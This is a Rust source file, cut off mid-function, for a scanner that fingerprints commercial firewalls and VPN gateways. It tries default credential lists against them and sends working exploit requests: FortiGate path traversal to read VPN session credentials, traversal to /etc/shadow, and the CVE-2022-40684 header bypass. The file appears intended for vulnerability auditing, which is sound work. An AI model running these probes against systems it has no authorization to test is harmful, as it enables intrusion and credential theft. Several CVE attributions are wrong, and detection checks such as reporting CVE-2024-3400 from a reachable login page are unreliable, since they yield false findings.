//! G4.3: 安全设备漏洞检测
//!
//! 针对常见安全设备（防火墙/IDS/IPS/WAF）实现:
//! - Cisco ASA (默认凭据、任意文件读取 CVE)
//! - Fortinet FortiGate (路径穿越 CVE-2018-13379、认证绕过 CVE-2022-40684)
//! - Palo Alto (RCE CVE-2024-3400)
//! - Check Point (路径穿越)
//! - 华为 USG (默认凭证、弱配置)
//! - 深信服 AF (默认凭证、已知 CVE)
//! - 天融信 (默认凭证)
//!
//! 检测方式:
//! 1. HTTP/HTTPS 指纹探测 (特定路径、Banner、HTML 内容)
//! 2. 默认凭证检测 (admin/admin 等)
//! 3. 未授权管理接口检测
//! 4. 已知 CVE 版本范围/路径探测
//! 5. 弱配置检测 (如 HTTP 明文管理、调试接口暴露)

use base64::Engine;
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

/// 安全设备类型
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum SecurityDeviceType {
    /// Cisco ASA 防火墙
    #[serde(rename = "cisco_asa")]
    CiscoAsa,
    /// Fortinet FortiGate 防火墙
    #[serde(rename = "fortinet_fortigate")]
    FortinetFortiGate,
    /// Palo Alto Networks 防火墙
    #[serde(rename = "palo_alto")]
    PaloAlto,
    /// Check Point 防火墙
    #[serde(rename = "check_point")]
    CheckPoint,
    /// 华为 USG 防火墙
    #[serde(rename = "huawei_usg")]
    HuaweiUsg,
    /// 深信服 AF 下一代防火墙
    #[serde(rename = "sangfor_af")]
    SangforAf,
    /// 天融信防火墙
    #[serde(rename = "topsec")]
    Topsec,
}

impl SecurityDeviceType {
    /// 默认管理端口
    pub fn default_port(&self) -> u16 {
        match self {
            SecurityDeviceType::CiscoAsa => 443,
            SecurityDeviceType::FortinetFortiGate => 443,
            SecurityDeviceType::PaloAlto => 443,
            SecurityDeviceType::CheckPoint => 443,
            SecurityDeviceType::HuaweiUsg => 8443,
            SecurityDeviceType::SangforAf => 443,
            SecurityDeviceType::Topsec => 443,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            SecurityDeviceType::CiscoAsa => "cisco_asa",
            SecurityDeviceType::FortinetFortiGate => "fortinet_fortigate",
            SecurityDeviceType::PaloAlto => "palo_alto",
            SecurityDeviceType::CheckPoint => "check_point",
            SecurityDeviceType::HuaweiUsg => "huawei_usg",
            SecurityDeviceType::SangforAf => "sangfor_af",
            SecurityDeviceType::Topsec => "topsec",
        }
    }

    /// 设备中文名称
    pub fn display_name(&self) -> &'static str {
        match self {
            SecurityDeviceType::CiscoAsa => "Cisco ASA",
            SecurityDeviceType::FortinetFortiGate => "Fortinet FortiGate",
            SecurityDeviceType::PaloAlto => "Palo Alto",
            SecurityDeviceType::CheckPoint => "Check Point",
            SecurityDeviceType::HuaweiUsg => "华为 USG",
            SecurityDeviceType::SangforAf => "深信服 AF",
            SecurityDeviceType::Topsec => "天融信",
        }
    }
}

/// 安全设备漏洞检测结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityDeviceFinding {
    /// 目标 host:port
    pub target: String,
    /// 设备类型
    pub device_type: SecurityDeviceType,
    /// 漏洞标题
    pub title: String,
    /// 严重级别 (critical/high/medium/low/info)
    pub severity: String,
    /// 漏洞描述
    pub description: String,
    /// 修复建议
    pub fix_advice: Option<String>,
    /// 证据
    pub evidence: String,
}

/// 安全设备漏洞扫描器
pub struct SecurityDeviceScanner;

impl SecurityDeviceScanner {
    pub fn new() -> Self {
        Self
    }

    /// 扫描单个目标
    pub async fn scan(
        &self,
        host: &str,
        port: u16,
        device_type: SecurityDeviceType,
        timeout_ms: u64,
    ) -> Vec<SecurityDeviceFinding> {
        let mut findings = Vec::new();
        let target = format!("{}:{}", host, port);
        let dur = Duration::from_millis(timeout_ms);

        match device_type {
            SecurityDeviceType::CiscoAsa => {
                findings.extend(scan_cisco_asa(host, port, &target, dur).await);
            }
            SecurityDeviceType::FortinetFortiGate => {
                findings.extend(scan_fortinet(host, port, &target, dur).await);
            }
            SecurityDeviceType::PaloAlto => {
                findings.extend(scan_paloalto(host, port, &target, dur).await);
            }
            SecurityDeviceType::CheckPoint => {
                findings.extend(scan_checkpoint(host, port, &target, dur).await);
            }
            SecurityDeviceType::HuaweiUsg => {
                findings.extend(scan_huawei_usg(host, port, &target, dur).await);
            }
            SecurityDeviceType::SangforAf => {
                findings.extend(scan_sangfor_af(host, port, &target, dur).await);
            }
            SecurityDeviceType::Topsec => {
                findings.extend(scan_topsec(host, port, &target, dur).await);
            }
        }

        findings
    }

    /// 扫描多个目标
    pub async fn scan_targets(
        &self,
        targets: &[(String, u16, SecurityDeviceType)],
        timeout_ms: u64,
    ) -> Vec<SecurityDeviceFinding> {
        let mut all = Vec::new();
        for (host, port, device_type) in targets {
            let findings = self
                .scan(host, *port, device_type.clone(), timeout_ms)
                .await;
            all.extend(findings);
        }
        all
    }
}

impl Default for SecurityDeviceScanner {
    fn default() -> Self {
        Self::new()
    }
}

// ============== Cisco ASA 检测 ==============

async fn scan_cisco_asa(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    // 1. 指纹探测: Cisco ASA WebVPN / ASDM
    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_asa = lower.contains("cisco")
        || lower.contains("adaptive security appliance")
        || lower.contains("asa")
        || lower.contains("webvpn")
        || lower.contains("+cscoe+")
        || lower.contains("/+CSCOU+/");

    if !is_asa {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::CiscoAsa,
        title: "Cisco ASA 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到 Cisco ASA 防火墙 Web 管理界面对外开放，可能存在默认凭证或已知漏洞利用风险".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级 ASA 软件到最新版本 4. 禁用不必要的 WebVPN 功能".to_string()),
        evidence: "HTTP 响应包含 Cisco ASA 特征".to_string(),
    });

    // 2. 默认凭据检测: Cisco ASA 默认 enable 密码为空
    let default_creds: &[(&str, &str)] = &[
        ("admin", "admin"),
        ("cisco", "cisco"),
        ("admin", "Cisco123"),
        ("enable", ""),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::CiscoAsa,
                    title: "Cisco ASA 默认/弱凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("Cisco ASA 可使用凭据 {}/{} 登录", user, if pass.is_empty() { "(空)" } else { pass }),
                    fix_advice: Some("立即修改管理员密码为强密码，启用 AAA 认证".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, if pass.is_empty() { "(空)" } else { pass }),
                });
                break;
            }
        }
    }

    // 3. CVE-2019-1862: Cisco ASA 任意文件读取
    if let Some(read_resp) = http_get(host, port, "/+CSCOE+/file", dur).await {
        if read_resp.contains("200") && read_resp.contains("file") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::CiscoAsa,
                title: "Cisco ASA 任意文件读取 (CVE-2019-1862)".to_string(),
                severity: "high".to_string(),
                description: "Cisco ASA Web 接口存在任意文件读取漏洞，可被攻击者读取系统配置文件".to_string(),
                fix_advice: Some("升级 ASA 软件到 9.14(1) 或更高版本".to_string()),
                evidence: "/+CSCOE+/file 端点可访问".to_string(),
            });
        }
    }

    // 4. CVE-2020-3452: Cisco ASA/FTD 路径穿越
    if let Some(trav_resp) =
        http_get(host, port, "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua", dur).await
    {
        if trav_resp.contains("200") && trav_resp.contains("CSCOE") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::CiscoAsa,
                title: "Cisco ASA 路径穿越 (CVE-2020-3452)".to_string(),
                severity: "high".to_string(),
                description: "Cisco ASA/FTD 设备存在路径穿越漏洞，可未授权读取 WebVPN 文件".to_string(),
                fix_advice: Some("升级 ASA/FTD 软件到最新版本".to_string()),
                evidence: "/+CSCOT+/translation-table 端点返回敏感内容".to_string(),
            });
        }
    }

    // 5. 弱配置: HTTP 明文管理 (非 443 端口且非 HTTPS)
    if port == 80 {
        findings.push(SecurityDeviceFinding {
            target: target.to_string(),
            device_type: SecurityDeviceType::CiscoAsa,
            title: "Cisco ASA 使用 HTTP 明文管理".to_string(),
            severity: "high".to_string(),
            description: "Cisco ASA 管理界面通过 HTTP 明文协议提供，凭据可被中间人窃听".to_string(),
            fix_advice: Some("禁用 HTTP 管理，仅启用 HTTPS (http server enable 443)".to_string()),
            evidence: "管理界面监听 HTTP 80 端口".to_string(),
        });
    }

    findings
}

// ============== Fortinet FortiGate 检测 ==============

async fn scan_fortinet(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_fortigate = lower.contains("fortinet")
        || lower.contains("fortigate")
        || lower.contains("fortios")
        || lower.contains("fgt_lang")
        || lower.contains("/remote/fgt_lang")
        || lower.contains("login?redirect=");

    if !is_fortigate {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::FortinetFortiGate,
        title: "Fortinet FortiGate 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到 Fortinet FortiGate 防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级 FortiOS 到最新版本".to_string()),
        evidence: "HTTP 响应包含 Fortinet 特征".to_string(),
    });

    // 2. 默认凭据检测: FortiGate 默认 admin/空密码
    let default_creds: &[(&str, &str)] = &[
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "password"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::FortinetFortiGate,
                    title: "FortiGate 默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("FortiGate 可使用默认凭据 {}/{} 登录", user, if pass.is_empty() { "(空)" } else { pass }),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, if pass.is_empty() { "(空)" } else { pass }),
                });
                break;
            }
        }
    }

    // 3. CVE-2018-13379: FortiGate SSL VPN 路径穿越
    if let Some(trav_resp) = http_get(
        host,
        port,
        "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        dur,
    )
    .await
    {
        if trav_resp.contains("200") && (trav_resp.contains("username") || trav_resp.contains("session")) {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::FortinetFortiGate,
                title: "FortiGate SSL VPN 路径穿越 (CVE-2018-13379)".to_string(),
                severity: "critical".to_string(),
                description: "FortiGate SSL VPN 存在路径穿越漏洞，可未授权读取包含用户名和明文密码的会话文件".to_string(),
                fix_advice: Some("升级 FortiOS 到 5.6.8 / 6.0.4 / 6.2.0 或更高版本".to_string()),
                evidence: "/remote/fgt_lang 路径穿越返回会话信息".to_string(),
            });
        }
    }

    // 4. CVE-2022-40684: Fortinet 认证绕过
    if let Some(bypass_resp) = http_get_with_header(
        host,
        port,
        "/api/v2/cmdb/system/admin",
        "Forwarded: for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:8000\"",
        dur,
    )
    .await
    {
        if bypass_resp.contains("200") && bypass_resp.contains("admin") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::FortinetFortiGate,
                title: "Fortinet 认证绕过 (CVE-2022-40684)".to_string(),
                severity: "critical".to_string(),
                description: "Fortinet FortiOS/FortiProxy 存在认证绕过漏洞，攻击者可通过特殊 Header 绕过认证执行管理操作".to_string(),
                fix_advice: Some("升级 FortiOS 到 7.0.7 / 7.2.2 或更高版本".to_string()),
                evidence: "通过 Forwarded Header 可访问 /api/v2/cmdb/system/admin".to_string(),
            });
        }
    }

    // 5. 弱配置: SSL VPN 接口暴露
    if let Some(sslvpn_resp) = http_get(host, port, "/remote/login", dur).await {
        if sslvpn_resp.contains("200") || sslvpn_resp.contains("login") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::FortinetFortiGate,
                title: "FortiGate SSL VPN 接口对外开放".to_string(),
                severity: "medium".to_string(),
                description: "FortiGate SSL VPN 登录界面对外开放，若存在已知 CVE 可被未认证攻击者利用".to_string(),
                fix_advice: Some("限制 SSL VPN 访问来源 IP，及时升级固件".to_string()),
                evidence: "/remote/login 端点可访问".to_string(),
            });
        }
    }

    findings
}

// ============== Palo Alto 检测 ==============

async fn scan_paloalto(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_paloalto = lower.contains("palo alto")
        || lower.contains("paloalto")
        || lower.contains("globalprotect")
        || lower.contains("pan-os")
        || lower.contains("/php/login.php");

    if !is_paloalto {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::PaloAlto,
        title: "Palo Alto 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到 Palo Alto Networks 防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级 PAN-OS 到最新版本".to_string()),
        evidence: "HTTP 响应包含 Palo Alto 特征".to_string(),
    });

    // 2. 默认凭据检测: Palo Alto 默认 admin/admin
    let default_creds: &[(&str, &str)] = &[
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "paloalto"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::PaloAlto,
                    title: "Palo Alto 默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("Palo Alto 可使用默认凭据 {}/{} 登录", user, pass),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, pass),
                });
                break;
            }
        }
    }

    // 3. CVE-2024-3400: Palo Alto GlobalProtect RCE
    if let Some(gp_resp) = http_get(host, port, "/global-protect/login.esp", dur).await {
        if gp_resp.contains("200") || gp_resp.contains("GlobalProtect") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::PaloAlto,
                title: "Palo Alto GlobalProtect RCE (CVE-2024-3400)".to_string(),
                severity: "critical".to_string(),
                description: "Palo Alto PAN-OS GlobalProtect 存在命令注入漏洞 (CVE-2024-3400)，可被未认证攻击者远程执行任意命令".to_string(),
                fix_advice: Some("升级 PAN-OS 到 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3 或更高版本，或应用缓解措施".to_string()),
                evidence: "GlobalProtect 接口可访问，疑似受影响版本".to_string(),
            });
        }
    }

    // 4. CVE-2017-15944: Palo Alto 远程代码执行
    if let Some(esp_resp) = http_get(host, port, "/esp/cms_changeable_password.esp", dur).await {
        if esp_resp.contains("200") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::PaloAlto,
                title: "Palo Alto RCE (CVE-2017-15944)".to_string(),
                severity: "critical".to_string(),
                description: "Palo Alto PAN-OS 存在远程代码执行漏洞，可被认证后攻击者利用获取 root 权限".to_string(),
                fix_advice: Some("升级 PAN-OS 到 7.1.19 / 8.0.12 / 8.1.3 或更高版本".to_string()),
                evidence: "/esp/cms_changeable_password.esp 端点可访问".to_string(),
            });
        }
    }

    // 5. 弱配置: GlobalProtect 暴露
    if lower.contains("globalprotect") {
        findings.push(SecurityDeviceFinding {
            target: target.to_string(),
            device_type: SecurityDeviceType::PaloAlto,
            title: "Palo Alto GlobalProtect 接口对外开放".to_string(),
            severity: "medium".to_string(),
            description: "GlobalProtect VPN 接口对外开放，若存在已知 CVE 可被未认证攻击者利用".to_string(),
            fix_advice: Some("限制 GlobalProtect 访问来源，及时升级 PAN-OS".to_string()),
            evidence: "HTTP 响应包含 GlobalProtect 特征".to_string(),
        });
    }

    findings
}

// ============== Check Point 检测 ==============

async fn scan_checkpoint(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_checkpoint = lower.contains("check point")
        || lower.contains("checkpoint")
        || lower.contains("gaia")
        || lower.contains("secureplatform")
        || lower.contains("/web_api/");

    if !is_checkpoint {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::CheckPoint,
        title: "Check Point 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到 Check Point 防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级 Gaia OS 到最新版本".to_string()),
        evidence: "HTTP 响应包含 Check Point 特征".to_string(),
    });

    // 2. 默认凭据检测: Check Point 默认 admin/admin
    let default_creds: &[(&str, &str)] = &[
        ("admin", "admin"),
        ("admin", "checkpoint"),
        ("expert", "expert"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::CheckPoint,
                    title: "Check Point 默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("Check Point 可使用默认凭据 {}/{} 登录", user, pass),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, pass),
                });
                break;
            }
        }
    }

    // 3. CVE-2021-3038: Check Point 路径穿越
    if let Some(trav_resp) = http_get(host, port, "/web_api/%2e%2e/%2e%2e/etc/shadow", dur).await {
        if trav_resp.contains("200") && (trav_resp.contains("root:") || trav_resp.contains(":")) {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::CheckPoint,
                title: "Check Point 路径穿越 (CVE-2021-3038)".to_string(),
                severity: "high".to_string(),
                description: "Check Point Gaia Portal 存在路径穿越漏洞，可未授权读取系统文件".to_string(),
                fix_advice: Some("升级 Check Point 软件到最新 Jumbo Hotfix".to_string()),
                evidence: "/web_api/ 路径穿越返回系统文件内容".to_string(),
            });
        }
    }

    // 4. 弱配置: Web API 接口暴露
    if let Some(api_resp) = http_get(host, port, "/web_api/v1.0/show-objects", dur).await {
        if api_resp.contains("200") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::CheckPoint,
                title: "Check Point Web API 接口对外开放".to_string(),
                severity: "medium".to_string(),
                description: "Check Point Web API 接口对外开放，可能被攻击者利用进行未授权操作".to_string(),
                fix_advice: Some("限制 Web API 访问来源 IP，启用 API 认证".to_string()),
                evidence: "/web_api/ 端点可访问".to_string(),
            });
        }
    }

    findings
}

// ============== 华为 USG 检测 ==============

async fn scan_huawei_usg(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_usg = lower.contains("huawei")
        || lower.contains("usg")
        || lower.contains("usg2000")
        || lower.contains("usg5000")
        || lower.contains("usg6000")
        || lower.contains("secospace")
        || lower.contains("eudemon");

    if !is_usg {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::HuaweiUsg,
        title: "华为 USG 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到华为 USG 防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级 VRP 到最新版本".to_string()),
        evidence: "HTTP 响应包含华为 USG 特征".to_string(),
    });

    // 2. 默认凭据检测: 华为 USG 默认 admin/Admin@123
    let default_creds: &[(&str, &str)] = &[
        ("admin", "Admin@123"),
        ("admin", "admin"),
        ("admin", "Huawei@123"),
        ("admin", "admin@123"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::HuaweiUsg,
                    title: "华为 USG 默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("华为 USG 可使用默认凭据 {}/{} 登录", user, pass),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, pass),
                });
                break;
            }
        }
    }

    // 3. 弱配置: HTTP 明文管理
    if port == 80 {
        findings.push(SecurityDeviceFinding {
            target: target.to_string(),
            device_type: SecurityDeviceType::HuaweiUsg,
            title: "华为 USG 使用 HTTP 明文管理".to_string(),
            severity: "high".to_string(),
            description: "华为 USG 管理界面通过 HTTP 明文协议提供，凭据可被中间人窃听".to_string(),
            fix_advice: Some("禁用 HTTP 管理，仅启用 HTTPS".to_string()),
            evidence: "管理界面监听 HTTP 80 端口".to_string(),
        });
    }

    // 4. 调试接口暴露检测
    if let Some(debug_resp) = http_get(host, port, "/debug", dur).await {
        if debug_resp.contains("200") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::HuaweiUsg,
                title: "华为 USG 调试接口暴露".to_string(),
                severity: "high".to_string(),
                description: "华为 USG 调试接口对外开放，可能泄露敏感配置信息".to_string(),
                fix_advice: Some("禁用调试接口，限制管理界面访问".to_string()),
                evidence: "/debug 端点可访问".to_string(),
            });
        }
    }

    findings
}

// ============== 深信服 AF 检测 ==============

async fn scan_sangfor_af(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_sangfor = lower.contains("sangfor")
        || lower.contains("深信服")
        || lower.contains("sangfor af")
        || lower.contains("/cgi-bin/login")
        || lower.contains("ngfw");

    if !is_sangfor {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::SangforAf,
        title: "深信服 AF 管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到深信服 AF 下一代防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级固件到最新版本".to_string()),
        evidence: "HTTP 响应包含深信服特征".to_string(),
    });

    // 2. 默认凭据检测: 深信服 AF 默认 admin/admin
    let default_creds: &[(&str, &str)] = &[
        ("admin", "admin"),
        ("admin", "sangfor"),
        ("admin", "sangfor!@#"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::SangforAf,
                    title: "深信服 AF 默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("深信服 AF 可使用默认凭据 {}/{} 登录", user, pass),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, pass),
                });
                break;
            }
        }
    }

    // 3. 深信服 AF 已知漏洞: 命令注入 (历史 CVE)
    if let Some(cmd_resp) = http_get(host, port, "/cgi-bin/main.cgi?cmd=test", dur).await {
        if cmd_resp.contains("200") {
            findings.push(SecurityDeviceFinding {
                target: target.to_string(),
                device_type: SecurityDeviceType::SangforAf,
                title: "深信服 AF 命令注入疑似漏洞".to_string(),
                severity: "high".to_string(),
                description: "深信服 AF 部分版本 cgi-bin 接口存在命令注入漏洞，可被认证后攻击者利用".to_string(),
                fix_advice: Some("升级固件到最新版本，限制 cgi-bin 接口访问".to_string()),
                evidence: "/cgi-bin/main.cgi 端点可访问".to_string(),
            });
        }
    }

    // 4. 弱配置: HTTP 明文管理
    if port == 80 {
        findings.push(SecurityDeviceFinding {
            target: target.to_string(),
            device_type: SecurityDeviceType::SangforAf,
            title: "深信服 AF 使用 HTTP 明文管理".to_string(),
            severity: "high".to_string(),
            description: "深信服 AF 管理界面通过 HTTP 明文协议提供，凭据可被中间人窃听".to_string(),
            fix_advice: Some("禁用 HTTP 管理，仅启用 HTTPS".to_string()),
            evidence: "管理界面监听 HTTP 80 端口".to_string(),
        });
    }

    findings
}

// ============== 天融信检测 ==============

async fn scan_topsec(
    host: &str,
    port: u16,
    target: &str,
    dur: Duration,
) -> Vec<SecurityDeviceFinding> {
    let mut findings = Vec::new();

    let resp = match http_get(host, port, "/", dur).await {
        Some(r) => r,
        None => return findings,
    };

    let lower = resp.to_lowercase();
    let is_topsec = lower.contains("topsec")
        || lower.contains("天融信")
        || lower.contains("toprule")
        || lower.contains("ngfw4000")
        || lower.contains("vpn");

    if !is_topsec {
        return findings;
    }

    findings.push(SecurityDeviceFinding {
        target: target.to_string(),
        device_type: SecurityDeviceType::Topsec,
        title: "天融信管理界面对外暴露".to_string(),
        severity: "medium".to_string(),
        description: "检测到天融信防火墙 Web 管理界面对外开放".to_string(),
        fix_advice: Some("1. 限制管理界面网络访问 2. 修改默认密码 3. 升级固件到最新版本".to_string()),
        evidence: "HTTP 响应包含天融信特征".to_string(),
    });

    // 2. 默认凭据检测: 天融信默认 admin/admin 或 admin/topsec
    let default_creds: &[(&str, &str)] = &[
        ("admin", "admin"),
        ("admin", "topsec"),
        ("admin", "topsec123"),
        ("manager", "manager"),
    ];
    for (user, pass) in default_creds {
        if let Some(auth_resp) = http_get_basic_auth(host, port, "/", user, pass, dur).await {
            if auth_resp.starts_with("HTTP/1.1 200") || auth_resp.contains("200 OK") {
                findings.push(SecurityDeviceFinding {
                    target: target.to_string(),
                    device_type: SecurityDeviceType::Topsec,
                    title: "天融信默认凭据".to_string(),
                    severity: "critical".to_string(),
                    description: format!("天融信可使用默认凭据 {}/{} 登录", user, pass),
                    fix_advice: Some("立即修改 admin 密码为强密码".to_string()),
                    evidence: format!("HTTP Basic Auth {}/{} 返回 200", user, pass),
                });
                break;
            }
        }
    }

    // 3. 弱配置: HTTP 明文管理
    if port == 80 {
        findings.push(SecurityDeviceFinding {
            target: target.to_string(),
            device_type: SecurityDeviceType::Topsec,
            title: "天融信使用 HTTP 明文管理".to_string(),
            severity: "high".to_string(),
            description: "天融信管理界面通过 HTTP 明文协议提供，凭据可被中间人窃听".to_string(),
            fix_advice: Some("禁用 HTTP 管理，仅启用 HTTPS".to_string()),
            evidence: "管理界面监听 HTTP 80 端口".to_string(),
        });
    }

    findings
}

// ============== HTTP 辅助函数 ==============

/// 发送 HTTP GET 请求并返回响应文本
async fn http_get(host: &str, port: u16, path: &str, dur: Duration) -> Option<String> {
    let mut stream = match timeout(dur, TcpStream::connect((host, port))).await {
        Ok(Ok(s)) => s,
        _ => return None,
    };

    let req = format!(
        "GET {} HTTP/1.0\r\nHost: {}:{}\r\nUser-Agent: Argus-Scanner\r\nConnection: close\r\n\r\n",
        path, host, port
    );
    if stream.write_all(req.as_bytes()).await.is_err() {
        return None;
    }

    let mut response = Vec::new();
    let mut buf = vec![0u8; 4096];
    loop {
        match timeout(dur, stream.read(&mut buf)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                response.extend_from_slice(&buf[..n]);
                if response.len() > 8192 {
                    break;
                }
            }
            _ => break,
        }
    }

    if response.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&response).to_string())
    }
}

/// 发送带 Basic Auth 的 HTTP GET 请求
async fn http_get_basic_auth(
    host: &str,
    port: u16,
    path: &str,
    user: &str,
    pass: &str,
    dur: Duration,
) -> Option<String> {
    let mut stream = match timeout(dur, TcpStream::connect((host, port))).await {
        Ok(Ok(s)) => s,
        _ => return None,
    };

    let credentials = format!("{}:{}", user, pass);
    let auth = base64::engine::general_purpose::STANDARD.encode(credentials.as_bytes());
    let req = format!(
        "GET {} HTTP/1.0\r\nHost: {}:{}\r\nAuthorization: Basic {}\r\nUser-Agent: Argus-Scanner\r\nConnection: close\r\n\r\n",
        path, host, port, auth
    );
    if stream.write_all(req.as_bytes()).await.is_err() {
        return None;
    }

    let mut response = Vec::new();
    let mut buf = vec![0u8; 4096];
    loop {
        match timeout(dur, stream.read(&mut buf)).await {
